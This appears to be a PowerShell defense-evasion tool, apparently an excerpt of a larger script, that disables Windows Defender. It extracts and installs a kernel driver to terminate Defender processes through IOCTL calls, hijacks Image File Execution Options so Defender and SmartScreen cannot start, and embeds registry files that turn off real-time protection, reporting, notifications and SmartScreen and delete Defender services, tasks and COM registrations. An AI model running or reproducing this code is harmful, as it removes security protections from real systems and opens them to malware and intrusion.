$KILL_TARGETS = @('MsMpEng.exe', 'SecurityHealthSystray.exe', 'MpDefenderCoreService.exe', 'SecurityHealthService.exe', 'smartscreen.exe')
$IFEO_KEY = 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options'
$TEMP_HIVE_NAME = 'TempIFEO'
$DEBUGGER_VALUE = 'Debugger'
$DEBUGGER_PAYLOAD = 'systray.exe'
$IFEO_TARGETS = @('MsMpEng.exe', 'SecurityHealthSystray.exe', 'SecurityHealthService.exe', 'MpDefenderCoreService.exe')


Add-Type -AssemblyName UIAutomationClient
Add-Type -AssemblyName UIAutomationTypes
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

Add-Type @'
using System;
using System.Runtime.InteropServices;
using System.Text;
public class WinAPI {
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    public static extern IntPtr CreateFileW(string lpFileName, uint dwDesiredAccess,
        uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition,
        uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool DeviceIoControl(IntPtr hDevice, uint ioControlCode,
        byte[] inBuffer, uint inBufferSize, IntPtr outBuffer, uint outBufferSize,
        out uint bytesReturned, IntPtr overlapped);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr handle);

    [DllImport("user32.dll")]
    public static extern bool EnumWindows(EnumWindowsProc enumProc, IntPtr lParam);

    [DllImport("user32.dll")]
    public static extern int GetClassName(IntPtr hWnd, StringBuilder text, int count);

    [DllImport("user32.dll")]
    public static extern bool IsWindowVisible(IntPtr hWnd);

    [DllImport("user32.dll")]
    public static extern bool SetForegroundWindow(IntPtr hWnd);

    [DllImport("user32.dll")]
    public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("user32.dll")]
    public static extern bool IsWindow(IntPtr hWnd);

    public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

    public const uint GENERIC_READ        = 0x80000000;
    public const uint GENERIC_WRITE       = 0x40000000;
    public const uint OPEN_EXISTING       = 3;
    public const uint FILE_ATTR_NORMAL    = 0x80;
    public const uint WM_SYSCOMMAND       = 0x0112;
    public const uint SC_CLOSE            = 0xF060;
    public const uint WM_CLOSE            = 0x0010;
    public const int  SW_SHOWMINNOACTIVE  = 7;
}
'@ -ErrorAction Stop

$INVALID_HANDLE = [IntPtr]::new(-1)



function Install-KillerService {
  param([string]$BinPath)
  & sc.exe create $DRV_SERVICE type= kernel start= demand error= normal binPath= "$BinPath" DisplayName= "$DRV_SERVICE" | Out-Null
  return ($LASTEXITCODE -eq 0)
}

function Start-KillerService {
  & sc.exe start $DRV_SERVICE | Out-Null
  if ($LASTEXITCODE -eq 0) { return $true }
  # ERROR_SERVICE_ALREADY_RUNNING (1056) treated as success
  return ($LASTEXITCODE -eq 1056)
}

function Stop-KillerService {
  & sc.exe stop $DRV_SERVICE | Out-Null
  Start-Sleep -Milliseconds 300
  & sc.exe delete $DRV_SERVICE | Out-Null
}


function Kill-DefenderProcs {
  $h = [WinAPI]::CreateFileW($DRV_DEVICE,
    ([WinAPI]::GENERIC_READ -bor [WinAPI]::GENERIC_WRITE),
    0, [IntPtr]::Zero, [WinAPI]::OPEN_EXISTING, [WinAPI]::FILE_ATTR_NORMAL, [IntPtr]::Zero)
  if ($h -eq $INVALID_HANDLE) {
    Write-Host '  [ERROR] Cannot open \\.\Warsaw_PM' -F Red
    return $false
  }

  $any = $false
  foreach ($name in $KILL_TARGETS) {
    $procs = @(Get-Process -Name ([IO.Path]::GetFileNameWithoutExtension($name)) -EA SilentlyContinue)
    foreach ($p in $procs) {
      $buf = New-Object byte[] 1036
      [BitConverter]::GetBytes([uint32]$p.Id).CopyTo($buf, 0)
      $ret = 0
      $ok = [WinAPI]::DeviceIoControl($h, $DRV_IOCTL, $buf, 1036, [IntPtr]::Zero, 0, [ref]$ret, [IntPtr]::Zero)
      if ($ok) {
        Write-Host "  [+] $name (PID $($p.Id)) terminated"
        $any = $true
      }
      else {
        Write-Host "  [-] IOCTL failed for $name PID $($p.Id) (err=$([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
      }
    }
  }
  [WinAPI]::CloseHandle($h) | Out-Null
  return $any
}



function Invoke-Reg {
  param([string[]]$RegArgs)
  & reg.exe @RegArgs *>$null
  return $LASTEXITCODE
}

function Set-IFEOBlock {
  param([bool]$AddBlock)
  $hivePath = Join-Path $env:TEMP 'Ifeo.hiv'
  Remove-Item $hivePath -Force -EA SilentlyContinue
  Remove-Item ("$hivePath.LOG1") -Force -EA SilentlyContinue
  Remove-Item ("$hivePath.LOG2") -Force -EA SilentlyContinue

  # Unload if still loaded from a prior crash
  Invoke-Reg @('unload', "HKLM\$TEMP_HIVE_NAME") | Out-Null

  # Snapshot live IFEO
  if ((Invoke-Reg @('save', "HKLM\$IFEO_KEY", $hivePath, '/y')) -ne 0) {
    Write-Host '  [!] reg save IFEO failed' -F Red; return $false
  }

  # Load it under a synthetic name we can modify
  if ((Invoke-Reg @('load', "HKLM\$TEMP_HIVE_NAME", $hivePath)) -ne 0) {
    Write-Host '  [!] reg load TempIFEO failed' -F Red; return $false
  }

  foreach ($t in $IFEO_TARGETS) {
    $sub = "HKLM\$TEMP_HIVE_NAME\$t"
    if ($AddBlock) {
      Invoke-Reg @('add', $sub, '/v', $DEBUGGER_VALUE, '/t', 'REG_SZ', '/d', $DEBUGGER_PAYLOAD, '/f') | Out-Null
    }
    else {
      Invoke-Reg @('delete', $sub, '/v', $DEBUGGER_VALUE, '/f') | Out-Null
      Invoke-Reg @('delete', $sub, '/f') | Out-Null
    }
  }

  Invoke-Reg @('unload', "HKLM\$TEMP_HIVE_NAME") | Out-Null

  # Restore (REG_FORCE_RESTORE) -- requires /f
  if ((Invoke-Reg @('restore', "HKLM\$IFEO_KEY", $hivePath, '/f')) -ne 0) {
    Write-Host '  [!] reg restore IFEO failed' -F Red
    Remove-Item $hivePath, "$hivePath.LOG1", "$hivePath.LOG2" -Force -EA SilentlyContinue
    return $false
  }

  Remove-Item $hivePath, "$hivePath.LOG1", "$hivePath.LOG2" -Force -EA SilentlyContinue
  return $true
}


function Extract-Driver {
  $cabBytes = [Convert]::FromBase64String($DriverCabB64)
  $cabFile = Join-Path $env:TEMP 'kk.cab'
  [IO.File]::WriteAllBytes($cabFile, $cabBytes)

  $dst = Join-Path $env:SystemRoot "System32\drivers\$DRV_FILENAME"
  # expand.exe wants explicit DESTFILE when source has a single named entry
  & expand.exe "$cabFile" "-F:$DRV_FILENAME" "$dst" *>$null
  $ec = $LASTEXITCODE
  Remove-Item $cabFile -Force -EA SilentlyContinue

  if ($ec -ne 0 -or -not (Test-Path $dst)) {
    Write-Host "  [ERROR] expand.exe failed (exit $ec) -- driver not written" -F Red
    return $null
  }

  Write-Host "  [+] $DRV_FILENAME deployed to drivers\ ($((Get-Item $dst).Length) B)"
  return $dst
}

function Remove-DriverFile {
  $dst = Join-Path $env:SystemRoot "System32\drivers\$DRV_FILENAME"
  Remove-Item $dst -Force -EA SilentlyContinue
}



function Invoke-Kill {
 
  Write-Host '  [*] Extracting kvckiller.sys from embedded CAB...'
  $drv = Extract-Driver
  if (-not $drv) { return 1 }

  Write-Host '  [*] Applying IFEO block...'
  Set-IFEOBlock -AddBlock $true | Out-Null

  Write-Host "  [*] Installing $DRV_SERVICE service..."
  if (-not (Install-KillerService -BinPath $drv)) {
    Write-Host '  [!] sc create failed' -F Red
    Remove-DriverFile
    return 1
  }
  if (-not (Start-KillerService)) {
    Write-Host '  [!] sc start failed' -F Red
    & sc.exe delete $DRV_SERVICE | Out-Null
    Remove-DriverFile
    return 1
  }

  Write-Host '  [*] Issuing IOCTL kill...'
  Kill-DefenderProcs | Out-Null
}


#reg files
$file1 = @'
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]
"DisableRoutinelyTakingAction"=dword:00000001
"ServiceKeepAlive"=dword:00000000
"AllowFastServiceStartup"=dword:00000000
"DisableLocalAdminMerge"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection]
"LocalSettingOverrideDisableOnAccessProtection"=dword:00000000
"LocalSettingOverrideRealtimeScanDirection"=dword:00000000
"LocalSettingOverrideDisableIOAVProtection"=dword:00000000
"LocalSettingOverrideDisableBehaviorMonitoring"=dword:00000000
"LocalSettingOverrideDisableIntrusionPreventionSystem"=dword:00000000
"LocalSettingOverrideDisableRealtimeMonitoring"=dword:00000000
"DisableIOAVProtection"=dword:00000001
"DisableRealtimeMonitoring"=dword:00000001
"DisableBehaviorMonitoring"=dword:00000001
"DisableOnAccessProtection"=dword:00000001
"DisableScanOnRealtimeEnable"=dword:00000001
"RealtimeScanDirection"=dword:00000002
"DisableInformationProtectionControl"=dword:00000001
"DisableIntrusionPreventionSystem"=dword:00000001
"DisableRawWriteNotification"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowBehaviorMonitoring]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows Defender]
"DisableRoutinelyTakingAction"=dword:00000001
'@
$file2 = @'
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowIOAVProtection]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]
"PUAProtection"=dword:00000000
"DisableRoutinelyTakingAction"=dword:00000001
"ServiceKeepAlive"=dword:00000000
"AllowFastServiceStartup"=dword:00000000
"DisableLocalAdminMerge"=dword:00000001
"DisableAntiSpyware"=dword:00000001
"RandomizeScheduleTaskTimes"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowArchiveScanning]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowBehaviorMonitoring]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowCloudProtection]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowEmailScanning]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowFullScanOnMappedNetworkDrives]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowFullScanRemovableDriveScanning]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowIntrusionPreventionSystem]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowOnAccessProtection]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowRealtimeMonitoring]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowScanningNetworkFiles]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowScriptScanning]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowUserUIAccess]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\CheckForSignaturesBeforeRunningScan]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\CloudBlockLevel]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\CloudExtendedTimeout]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\DaysToRetainCleanedMalware]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\DisableCatchupFullScan]
"value"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\DisableCatchupQuickScan]
"value"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\EnableControlledFolderAccess]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\EnableLowCPUPriority]
"value"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\EnableNetworkProtection]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\PUAProtection]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\RealTimeScanDirection]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\ScanParameter]
"value"=dword:00000002

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\ScheduleScanDay]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\ScheduleScanTime]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\SignatureUpdateInterval]
"value"=dword:00000018

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\SubmitSamplesConsent]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions]
"DisableAutoExclusions"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\MpEngine]
"MpEnablePus"=dword:00000000
"MpCloudBlockLevel"=dword:00000000
"MpBafsExtendedTimeout"=dword:00000000
"EnableFileHashComputation"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\NIS\Consumers\IPS]
"ThrottleDetectionEventsRate"=dword:00000000
"DisableSignatureRetirement"=dword:00000001
"DisableProtocolRecognition"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager]
"DisableScanningNetworkFiles"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection]
"DisableRealtimeMonitoring"=dword:00000001
"DisableBehaviorMonitoring"=dword:00000001
"DisableOnAccessProtection"=dword:00000001
"DisableScanOnRealtimeEnable"=dword:00000001
"DisableIOAVProtection"=dword:00000001
"LocalSettingOverrideDisableOnAccessProtection"=dword:00000000
"LocalSettingOverrideRealtimeScanDirection"=dword:00000000
"LocalSettingOverrideDisableIOAVProtection"=dword:00000000
"LocalSettingOverrideDisableBehaviorMonitoring"=dword:00000000
"LocalSettingOverrideDisableIntrusionPreventionSystem"=dword:00000000
"LocalSettingOverrideDisableRealtimeMonitoring"=dword:00000000
"RealtimeScanDirection"=dword:00000002
"IOAVMaxSize"=dword:00000512
"DisableInformationProtectionControl"=dword:00000001
"DisableIntrusionPreventionSystem"=dword:00000001
"DisableRawWriteNotification"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Scan]
"LowCpuPriority"=dword:00000001
"DisableRestorePoint"=dword:00000001
"DisableArchiveScanning"=dword:00000000
"DisableScanningNetworkFiles"=dword:00000000
"DisableCatchupFullScan"=dword:00000000
"DisableCatchupQuickScan"=dword:00000001
"DisableEmailScanning"=dword:00000000
"DisableHeuristics"=dword:00000001
"DisableReparsePointScanning"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates]
"SignatureDisableNotification"=dword:00000001
"RealtimeSignatureDelivery"=dword:00000000
"ForceUpdateFromMU"=dword:00000000
"DisableScheduledSignatureUpdateOnBattery"=dword:00000001
"UpdateOnStartUp"=dword:00000000
"SignatureUpdateCatchupInterval"=dword:00000002
"DisableUpdateOnStartupWithoutEngine"=dword:00000001
"ScheduleTime"=dword:00001440
"DisableScanOnUpdate"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet]
"DisableBlockAtFirstSeen"=dword:00000001
"LocalSettingOverrideSpynetReporting"=dword:00000000
"SpynetReporting"=dword:00000000
"SubmitSamplesConsent"=dword:00000002

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration]
"SuppressRebootNotification"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Controlled Folder Access]
"EnableControlledFolderAccess"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Network Protection]
"EnableNetworkProtection"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows Defender]
"DisableRoutinelyTakingAction"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Antimalware]
"ServiceKeepAlive"=dword:00000000
"AllowFastServiceStartup"=dword:00000000
"DisableRoutinelyTakingAction"=dword:00000001
"DisableAntiSpyware"=dword:00000001
"DisableAntiVirus"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Antimalware\SpyNet]
"SpyNetReporting"=dword:00000000
"LocalSettingOverrideSpyNetReporting"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting]
"DisableEnhancedNotifications"=dword:00000001
"DisableGenericRePorts"=dword:00000001
"WppTracingLevel"=dword:00000000
"WppTracingComponents"=dword:00000000

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\CI\Policy]
"VerifiedAndReputablePolicyState"=dword:00000000
'@
$file3 = @'
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\WindowsDefenderSecurityCenter\DisableEnhancedNotifications]
"value"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\WindowsDefenderSecurityCenter\DisableNotifications]
"value"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\WindowsDefenderSecurityCenter\HideWindowsSecurityNotificationAreaControl]
"value"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center]
"FirstRunDisabled"=dword:00000001
"AntiVirusOverride"=dword:00000001
"FirewallOverride"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications]
"DisableEnhancedNotifications"=dword:00000001
"DisableNotifications"=dword:00000001

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance]
"Enabled"=dword:00000000
'@
$file5 = @'
Windows Registry Editor Version 5.00

[-HKEY_LOCAL_MACHINE\Software\Classes\WOW6432Node\CLSID\{2781761E-28E0-4109-99FE-B9D127C57AFE}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{2781761E-28E0-4109-99FE-B9D127C57AFE}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{2781761E-28E2-4109-99FE-B9D127C57AFE}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{195B4D07-3DE2-4744-BBF2-D90121AE785B}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{361290c0-cb1b-49ae-9f3e-ba1cbe5dab35}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{45F2C32F-ED16-4C94-8493-D72EF93A051B}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{6CED0DAA-4CDE-49C9-BA3A-AE163DC3D7AF}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{8a696d12-576b-422e-9712-01b9dd84b446}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{8C9C0DB7-2CBA-40F1-AFE0-C55740DD91A0}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{A2D75874-6750-4931-94C1-C99D3BC9D0C7}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{A7C452EF-8E9F-42EB-9F2B-245613CA0DC9}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{DACA056E-216A-4FD1-84A6-C306A017ECEC}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{E3C9166D-1D39-4D4E-A45D-BC7BE9B00578}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{F6976CF5-68A8-436C-975A-40BE53616D59}]

[-HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{2781761E-28E0-4109-99FE-B9D127C57AFE}]

[-HKEY_CLASSES_ROOT\CLSID\{2781761E-28E0-4109-99FE-B9D127C57AFE}]

[-HKEY_CLASSES_ROOT\CLSID\{2781761E-28E2-4109-99FE-B9D127C57AFE}]

[-HKEY_CLASSES_ROOT\CLSID\{195B4D07-3DE2-4744-BBF2-D90121AE785B}]

[-HKEY_CLASSES_ROOT\CLSID\{361290c0-cb1b-49ae-9f3e-ba1cbe5dab35}]

[-HKEY_CLASSES_ROOT\CLSID\{45F2C32F-ED16-4C94-8493-D72EF93A051B}]

[-HKEY_CLASSES_ROOT\CLSID\{6CED0DAA-4CDE-49C9-BA3A-AE163DC3D7AF}]

[-HKEY_CLASSES_ROOT\CLSID\{8a696d12-576b-422e-9712-01b9dd84b446}]

[-HKEY_CLASSES_ROOT\CLSID\{8C9C0DB7-2CBA-40F1-AFE0-C55740DD91A0}]

[-HKEY_CLASSES_ROOT\CLSID\{A2D75874-6750-4931-94C1-C99D3BC9D0C7}]

[-HKEY_CLASSES_ROOT\CLSID\{A7C452EF-8E9F-42EB-9F2B-245613CA0DC9}]

[-HKEY_CLASSES_ROOT\CLSID\{DACA056E-216A-4FD1-84A6-C306A017ECEC}]

[-HKEY_CLASSES_ROOT\CLSID\{E3C9166D-1D39-4D4E-A45D-BC7BE9B00578}]

[-HKEY_CLASSES_ROOT\CLSID\{F6976CF5-68A8-436C-975A-40BE53616D59}]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger]
'@
$file6 = @'
Windows Registry Editor Version 5.00

[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0ACC9108-2000-46C0-8407-5FD9F89521E8}]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{1D77BCC8-1D07-42D0-8C89-3A98674DFB6F}]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{4A9233DB-A7D3-45D6-B476-8C7D8DF73EB5}]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{B05F34EE-83F2-413D-BC1D-7D5BD6E98300}]
'@
$file7 = @'
Windows Registry Editor Version 5.00

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MsSecCore]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wscsvc]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisDrv]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdFilter]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdBoot]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\webthreatdefusersvc]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\webthreatdefsvc]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SgrmAgent]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SgrmBroker]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend]

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection]
"DisallowExploitProtectionOverride"=dword:00000001

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MsSecFlt]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MsSecWfp]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MDCoreSvc]
'@
$file8 = @'
Windows Registry Editor Version 5.00

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend]

[-HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\windowsdefender]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Classes\AppUserModelId\Windows.Defender]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Classes\AppUserModelId\Microsoft.Windows.Defender]

[-HKEY_CLASSES_ROOT\AppX9kvz3rdv8t7twanaezbwfcdgrbg3bck0]

[-HKEY_CURRENT_USER\Software\Classes\ms-cxh]

[-HKEY_CLASSES_ROOT\Local Settings\MrtCache\C:%5CWindows%5CSystemApps%5CMicrosoft.Windows.AppRep.ChxApp_cw5n1h2txyewy%5Cresources.pri]

[-HKEY_CLASSES_ROOT\WindowsDefender]

[-HKEY_CURRENT_USER\Software\Classes\AppX9kvz3rdv8t7twanaezbwfcdgrbg3bck0]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WindowsDefender]

[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Ubpm]
"CriticalMaintenance_DefenderCleanup"=-
"CriticalMaintenance_DefenderVerification"=-

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Ubpm]
"CriticalMaintenance_DefenderCleanup"=-
"CriticalMaintenance_DefenderVerification"=-

[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\RestrictedServices\Static\System]
"WindowsDefender-1"=-
"WindowsDefender-2"=-
"WindowsDefender-3"=-

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\RestrictedServices\Static\System]
"WindowsDefender-1"=-
"WindowsDefender-2"=-
"WindowsDefender-3"=-
'@
$file9 = @'
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates]
"SignatureDisableNotification"=dword:00000001
"RealtimeSignatureDelivery"=dword:00000000
"ForceUpdateFromMU"=dword:00000000
"DisableScheduledSignatureUpdateOnBattery"=dword:00000001
"UpdateOnStartUp"=dword:00000000
"SignatureUpdateCatchupInterval"=dword:00000002
"DisableUpdateOnStartupWithoutEngine"=dword:00000001
"ScheduleTime"=dword:00001440
"DisableScanOnUpdate"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System]
"EnableSmartScreen"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen]
"ConfigureAppInstallControlEnabled"=dword:00000001
"ConfigureAppInstallControl"="Anywhere"

[HKEY_CURRENT_USER\Software\Microsoft\Windows Security Health\State]
"AppAndBrowser_EdgeSmartScreenOff"=dword:00000001
"AppAndBrowser_StoreAppsSmartScreenOff"=dword:00000001
"AppAndBrowser_PuaSmartScreenOff"=dword:00000001
'@
$file10 = @'
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
"Windows Defender"=-
"SecurityHealth"=-

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run]
"Windows Defender"=-
"SecurityHealth"=-

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
"WindowsDefender"=-
"SecurityHealth"=-

[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\exefile\shell\open]
"NoSmartScreen"=""

[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\exefile\shell\runas]
"NoSmartScreen"=""

[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\exefile\shell\runasuser]
"NoSmartScreen"=""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SmartScreen.exe]
"Debugger"="systray.exe"

'@
$file11 = @'
Windows Registry Editor Version 5.00

[-HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{a463fcb9-6b1c-4e0d-a80b-a2ca7999e25d}]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{a463fcb9-6b1c-4e0d-a80b-a2ca7999e25d}]

